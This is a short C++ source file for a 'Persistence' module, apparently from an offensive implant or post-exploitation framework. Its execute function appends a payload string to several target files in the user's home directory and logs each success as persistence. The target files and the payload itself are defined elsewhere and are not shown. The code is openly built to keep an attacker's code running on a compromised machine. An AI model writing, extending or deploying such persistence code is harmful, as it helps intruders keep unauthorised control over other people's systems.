#include "modules/Persistence.hpp"
#include "utils/Logger.hpp"
#include "utils/FileUtils.hpp"

bool Persistence::execute(const std::string& args) {
    LOG_INFO("Executing persistence");
    const char* home = std::getenv("HOME");
    if (!home) return false;

    bool success = false;
    for (const auto& target : targets) {
        std::string path = std::string(home) + "/" + target;

        if (FileUtils::appendToFile(path, payload)) {
            LOG_SUCCESS("Persisted in {}", path)
            success = true;
        }
    }

    return success;
}
